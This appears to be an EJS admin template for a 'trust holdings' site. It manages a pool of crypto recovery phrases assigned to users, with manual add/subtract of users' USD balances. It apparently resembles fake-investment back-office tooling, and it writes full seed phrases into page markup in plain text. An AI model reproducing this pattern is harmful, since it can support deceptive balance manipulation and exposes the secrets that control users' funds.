<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Pool | Montreval Trust Holdings</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap">
    <link rel="stylesheet" href="/assets/css/libraries.css">
    <link rel="stylesheet" href="/assets/css/icons.css">
    <link rel="stylesheet" href="/assets/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --brand-dark: #223140;
            --brand-white: #ffffff;
            --brand-gray: #94a3b8;
            --brand-border: rgba(255, 255, 255, 0.08);
            --brand-bg: rgba(255, 255, 255, 0.03);
            --bg-dark: #0f172a;
            --success: #22c55e;
            --warning: #f59e0b;
            --danger: #ef4444;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: var(--bg-dark);
            font-family: 'DM Sans', sans-serif;
            color: #e2e8f0;
            min-height: 100vh;
        }

        .admin-header {
            background: var(--brand-dark);
            border-bottom: 1px solid rgba(255,255,255,0.1);
            padding: 0 24px;
            height: 64px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .admin-header .logo {
            color: var(--brand-white);
            font-weight: 700;
            font-size: 1.1rem;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .admin-layout { display: flex; min-height: calc(100vh - 64px); }

        .admin-sidebar {
            width: 250px;
            background: rgba(255,255,255,0.02);
            border-right: 1px solid var(--brand-border);
            padding: 20px 0;
            flex-shrink: 0;
        }

        .admin-sidebar a {
            display: flex; align-items: center; gap: 12px;
            padding: 12px 24px; color: var(--brand-gray);
            text-decoration: none; font-size: 0.9rem;
            border-left: 3px solid transparent; transition: all 0.2s;
        }

        .admin-sidebar a:hover { background: rgba(255,255,255,0.03); color: var(--brand-white); }
        .admin-sidebar a.active { background: rgba(255,255,255,0.05); color: var(--brand-white); border-left-color: var(--brand-white); font-weight: 600; }
        .admin-sidebar a i { width: 20px; text-align: center; }

        .admin-main { flex: 1; padding: 30px; overflow-x: auto; }

        .page-header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 25px; flex-wrap: wrap; gap: 15px;
        }

        .page-header h1 { font-size: 1.8rem; color: var(--brand-white); }
        .page-header p { color: var(--brand-gray); font-size: 0.9rem; }

        .alert {
            padding: 14px 18px; border-radius: 10px; margin-bottom: 20px;
            display: flex; align-items: center; gap: 10px; font-size: 0.9rem;
        }

        .alert-success { background: rgba(34,197,94,0.1); border: 1px solid rgba(34,197,94,0.3); color: var(--success); }
        .alert-error { background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); color: var(--danger); }
        .alert-warning { background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.3); color: var(--warning); }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 16px;
            margin-bottom: 25px;
        }

        .stat-card {
            background: var(--brand-bg);
            border: 1px solid var(--brand-border);
            border-radius: 14px;
            padding: 20px;
        }

        .stat-value { font-size: 2rem; font-weight: 700; color: var(--brand-white); }
        .stat-label { color: var(--brand-gray); font-size: 0.8rem; margin-top: 2px; }

        .data-table {
            width: 100%; border-collapse: collapse;
            background: var(--brand-bg); border: 1px solid var(--brand-border);
            border-radius: 12px; overflow: hidden;
        }

        .data-table th {
            text-align: left; padding: 14px 16px;
            background: rgba(255,255,255,0.03); color: var(--brand-gray);
            font-weight: 500; font-size: 0.8rem; text-transform: uppercase;
            letter-spacing: 0.5px; border-bottom: 1px solid var(--brand-border);
        }

        .data-table td {
            padding: 14px 16px; border-bottom: 1px solid var(--brand-border);
            color: #e2e8f0; font-size: 0.9rem;
        }

        .data-table tr:last-child td { border-bottom: none; }
        .data-table small { color: var(--brand-gray); }

        code {
            font-family: 'Monaco', 'Courier New', monospace;
            color: var(--brand-white);
        }

        .badge {
            display: inline-block; padding: 4px 10px;
            border-radius: 100px; font-size: 0.7rem; font-weight: 600;
            text-transform: capitalize;
        }

        .badge-available { background: rgba(34,197,94,0.15); color: var(--success); }
        .badge-assigned { background: rgba(255,255,255,0.08); color: var(--brand-white); }
        .badge-viewed { background: rgba(245,158,11,0.15); color: var(--warning); }

        .chain-badge {
            display: inline-block; margin: 2px; padding: 2px 8px;
            background: rgba(255,255,255,0.04); border: 1px solid var(--brand-border);
            border-radius: 12px; font-size: 0.7rem; color: var(--brand-gray);
        }

        .action-buttons { display: flex; gap: 6px; flex-wrap: wrap; }

        .btn {
            padding: 8px 16px; border-radius: 8px; font-weight: 600;
            font-size: 0.8rem; cursor: pointer; text-decoration: none;
            display: inline-flex; align-items: center; gap: 6px;
            transition: all 0.2s; border: none;
        }

        .btn-primary { background: var(--brand-dark); color: var(--brand-white); border: 1px solid rgba(255,255,255,0.12); }
        .btn-primary:hover { background: #2d4257; }

        .btn-outline { background: transparent; border: 1px solid var(--brand-border); color: var(--brand-white); }
        .btn-outline:hover { background: rgba(255,255,255,0.05); border-color: rgba(255,255,255,0.25); }

        .btn-danger { background: rgba(239,68,68,0.15); color: var(--danger); border: 1px solid rgba(239,68,68,0.3); }
        .btn-danger:hover { background: rgba(239,68,68,0.25); }

        .btn-sm { padding: 6px 12px; font-size: 0.75rem; }

        /* Modal */
        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); display: none;
            align-items: center; justify-content: center; z-index: 1000;
        }

        .modal-content {
            background: #1a1f2e; border: 1px solid var(--brand-border);
            border-radius: 16px; padding: 30px; max-width: 700px;
            width: 90%; max-height: 90vh; overflow-y: auto;
        }

        .modal-content h3 { color: var(--brand-white); margin-bottom: 20px; }

        .form-group { margin-bottom: 16px; }

        .form-group label {
            display: block; margin-bottom: 6px;
            color: var(--brand-gray); font-size: 0.85rem; font-weight: 500;
        }

        .form-control {
            width: 100%; padding: 10px 14px;
            background: rgba(255,255,255,0.05); border: 1px solid var(--brand-border);
            border-radius: 8px; color: var(--brand-white); font-size: 0.9rem;
            font-family: inherit;
        }

        .form-control:focus { outline: none; border-color: rgba(255,255,255,0.3); }

        textarea.form-control { resize: vertical; }

        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }

        .modal-actions { display: flex; gap: 10px; margin-top: 20px; justify-content: flex-end; }

        .address-field {
            background: rgba(0,0,0,0.3); padding: 10px 12px;
            border-radius: 8px; font-family: monospace; font-size: 0.8rem;
            word-break: break-all; color: var(--brand-white);
        }

        @media (max-width: 768px) {
            .admin-layout { flex-direction: column; }
            .admin-sidebar { width: 100%; border-right: none; border-bottom: 1px solid var(--brand-border); }
            .admin-main { padding: 20px 15px; }
            .form-row { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

    <header class="admin-header">
        <a href="/admin/dashboard" class="logo">
            <i class="fas fa-shield-haltered"></i> MONTREVAL
        </a>
        <a href="/auth/logout" style="color:var(--brand-gray);text-decoration:none;font-size:0.85rem;">
            <i class="fas fa-sign-out-alt"></i> Logout
        </a>
    </header>

    <div class="admin-layout">
        <aside class="admin-sidebar">
            <nav>
                <a href="/admin/dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
                <a href="/admin/kyc"><i class="fas fa-id-card"></i> KYC Verification</a>
                <a href="/admin/plans"><i class="fas fa-box"></i> Plans</a>
                <a href="/admin/trusts"><i class="fas fa-file-alt"></i> Trust Applications</a>
                <!-- <a href="/admin/trusts"><i class="fas fa-shield-haltered"></i> Trust Management</a> -->
                <a href="/admin/withdrawals"><i class="fas fa-money-bill-wave"></i> Withdrawals</a>
                <a href="/admin/wallet-pool" class="active"><i class="fas fa-wallet"></i> Wallet Pool</a>
                <a href="/admin/users"><i class="fas fa-users"></i> Users</a>
            </nav>
        </aside>

        <main class="admin-main">
            <div class="page-header">
                <div>
                    <h1>Wallet Phrase Pool</h1>
                    <p>Manage recovery phrases with multi-chain addresses</p>
                </div>
                <div class="action-buttons">
                    <button class="btn btn-primary open-modal-btn" data-modal="addModal">
                        <i class="fas fa-plus"></i> Add Phrase
                    </button>
                    <button class="btn btn-outline open-modal-btn" data-modal="bulkModal">
                        <i class="fas fa-upload"></i> Bulk Import
                    </button>
                </div>
            </div>

            <% if (locals.success) { %><div class="alert alert-success"><i class="fas fa-check-circle"></i> <%= success %></div><% } %>
            <% if (locals.error) { %><div class="alert alert-error"><i class="fas fa-exclamation-circle"></i> <%= error %></div><% } %>

            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value"><%= stats.total %></div><div class="stat-label">Total</div></div>
                <div class="stat-card"><div class="stat-value" style="color:var(--success);"><%= stats.available %></div><div class="stat-label">Available</div></div>
                <div class="stat-card"><div class="stat-value" style="color:var(--brand-white);"><%= stats.assigned %></div><div class="stat-label">Assigned</div></div>
                <div class="stat-card"><div class="stat-value" style="color:var(--warning);"><%= stats.viewed %></div><div class="stat-label">Viewed</div></div>
            </div>

            <% if (stats.available < 5) { %>
                <div class="alert alert-warning"><i class="fas fa-exclamation-triangle"></i> Low on available phrases!</div>
            <% } %>

            <table class="data-table">
                <thead>
                    <tr>
                        <th>Phrase</th>
                        <th>Chains</th>
                        <th>Status</th>
                        <th>Assigned To</th>
                        <th>Created</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <% if (wallets && wallets.length > 0) { %>
                        <% wallets.forEach(wallet => { %>
                            <tr>
                                <td><code><%= wallet.recoveryPhrase.substring(0, 25) %>...</code></td>
                                <td>
                                    <% if (wallet.addresses) { %>
                                        <span class="chain-badge">BTC</span>
                                        <span class="chain-badge">ETH</span>
                                        <span class="chain-badge">USDT</span>
                                        <span class="chain-badge">XRP</span>
                                        <span class="chain-badge">BNB</span>
                                    <% } else { %>
                                        <span class="chain-badge">—</span>
                                    <% } %>
                                </td>
                                <td><span class="badge badge-<%= wallet.status %>"><%= wallet.status %></span></td>
                                <td>
                                    <% if (wallet.assignedTo) { %>
                                        <%= wallet.assignedTo.fullName || wallet.assignedTo.email %><br>
                                        <small><%= wallet.assignedAt?.toLocaleDateString() %></small>
                                    <% } else { %>—<% } %>
                                </td>
                                <td><%= wallet.createdAt.toLocaleDateString() %></td>
                                <td>
                                    <div class="action-buttons">
                                        <button class="btn btn-sm btn-outline adjust-balance-btn"
                                            data-wallet-id="<%= wallet._id %>"
                                            data-current-balance="<%= wallet.manualBalance || 0 %>">
                                            <i class="fas fa-dollar-sign"></i> Adjust
                                        </button>
                                        <button class="btn btn-sm btn-outline view-phrase-btn"
                                            data-phrase="<%= wallet.recoveryPhrase %>"
                                            data-btc="<%= wallet.addresses?.btc || '' %>"
                                            data-eth="<%= wallet.addresses?.eth || '' %>"
                                            data-usdt="<%= wallet.addresses?.usdt || '' %>"
                                            data-xrp="<%= wallet.addresses?.xrp || '' %>"
                                            data-bnb="<%= wallet.addresses?.bnb || '' %>">
                                            <i class="fas fa-eye"></i>
                                        </button>
                                        <% if (wallet.status === 'available') { %>
                                            <form action="/admin/wallet-pool/delete/<%= wallet._id %>" method="POST" style="display:inline;">
                                                <button type="submit" class="btn btn-sm btn-danger"><i class="fas fa-trash"></i></button>
                                            </form>
                                        <% } %>
                                    </div>
                                </td>
                            </tr>
                        <% }) %>
                    <% } else { %>
                        <tr><td colspan="6" style="text-align:center;padding:40px;color:var(--brand-gray);">No phrases in pool.</td></tr>
                    <% } %>
                </tbody>
            </table>
        </main>
    </div>

    <!-- Add Modal -->
    <div id="addModal" class="modal">
        <div class="modal-content">
            <h3>Add Recovery Phrase & Addresses</h3>
            <form action="/admin/wallet-pool/add" method="POST">
                <div class="form-group"><label>24-Word Recovery Phrase *</label><textarea name="recoveryPhrase" class="form-control" rows="3" required></textarea></div>
                <div class="form-row">
                    <div class="form-group"><label>BTC Address *</label><input type="text" name="btc" class="form-control" required></div>
                    <div class="form-group"><label>ETH Address *</label><input type="text" name="eth" class="form-control" required></div>
                </div>
                <div class="form-row">
                    <div class="form-group"><label>USDT Address *</label><input type="text" name="usdt" class="form-control" required></div>
                    <div class="form-group"><label>XRP Address *</label><input type="text" name="xrp" class="form-control" required></div>
                </div>
                <div class="form-group"><label>BNB Address *</label><input type="text" name="bnb" class="form-control" required></div>
                <div class="form-group"><label>Notes (optional)</label><input type="text" name="notes" class="form-control"></div>
                <div class="modal-actions">
                    <button type="submit" class="btn btn-primary">Add Phrase</button>
                    <button type="button" class="btn btn-outline close-modal-btn">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Adjust Balance Modal -->
    <div id="adjustModal" class="modal">
        <div class="modal-content" style="max-width:500px;">
            <h3>Adjust Balance</h3>
            <form id="adjustForm" action="" method="POST">
                <div class="form-group"><label>Amount (USD) *</label><input type="number" name="amount" class="form-control" step="0.01" min="0.01" required></div>
                <div class="form-group"><label>Operation *</label><select name="operation" class="form-control" required><option value="add">Add</option><option value="subtract">Subtract</option></select></div>
                <div class="form-group" id="reasonGroup"><label>Reason *</label><textarea name="reason" class="form-control" rows="3" id="adjustReason"></textarea></div>
                <div class="modal-actions">
                    <button type="submit" class="btn btn-primary">Confirm</button>
                    <button type="button" class="btn btn-outline close-modal-btn">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Bulk Modal -->
    <div id="bulkModal" class="modal">
        <div class="modal-content">
            <h3>Bulk Import</h3>
            <form action="/admin/wallet-pool/bulk-add" method="POST">
                <div class="form-group"><label>Paste CSV (one per line): phrase,btc,eth,usdt,xrp,bnb</label><textarea name="phrases" class="form-control" rows="10" required></textarea></div>
                <div class="modal-actions">
                    <button type="submit" class="btn btn-primary">Import</button>
                    <button type="button" class="btn btn-outline close-modal-btn">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <!-- View Modal -->
    <div id="viewModal" class="modal">
        <div class="modal-content">
            <h3>Wallet Details</h3>
            <div class="form-group"><label>Recovery Phrase</label><div class="address-field" id="viewPhrase"></div></div>
            <div class="form-row"><div class="form-group"><label>BTC</label><div class="address-field" id="viewBtc"></div></div><div class="form-group"><label>ETH</label><div class="address-field" id="viewEth"></div></div></div>
            <div class="form-row"><div class="form-group"><label>USDT</label><div class="address-field" id="viewUsdt"></div></div><div class="form-group"><label>XRP</label><div class="address-field" id="viewXrp"></div></div></div>
            <div class="form-group"><label>BNB</label><div class="address-field" id="viewBnb"></div></div>
            <div class="modal-actions"><button type="button" class="btn btn-primary close-modal-btn">Close</button></div>
        </div>
    </div>

    <script>
        // Modal open/close
        document.querySelectorAll('.open-modal-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                document.getElementById(btn.dataset.modal).style.display = 'flex';
            });
        });

        document.querySelectorAll('.close-modal-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                btn.closest('.modal').style.display = 'none';
            });
        });

        // Adjust balance
        document.querySelectorAll('.adjust-balance-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                const id = this.dataset.walletId;
                document.getElementById('adjustForm').action = '/admin/wallet/adjust/' + id;
                document.getElementById('adjustModal').style.display = 'flex';
            });
        });

        // View phrase
        document.querySelectorAll('.view-phrase-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.getElementById('viewPhrase').textContent = this.dataset.phrase;
                document.getElementById('viewBtc').textContent = this.dataset.btc || '—';
                document.getElementById('viewEth').textContent = this.dataset.eth || '—';
                document.getElementById('viewUsdt').textContent = this.dataset.usdt || '—';
                document.getElementById('viewXrp').textContent = this.dataset.xrp || '—';
                document.getElementById('viewBnb').textContent = this.dataset.bnb || '—';
                document.getElementById('viewModal').style.display = 'flex';
            });
        });

        // Close modal on overlay click
        document.querySelectorAll('.modal').forEach(modal => {
            modal.addEventListener('click', function(e) {
                if (e.target === modal) modal.style.display = 'none';
            });
        });
    </script>
</body>
</html>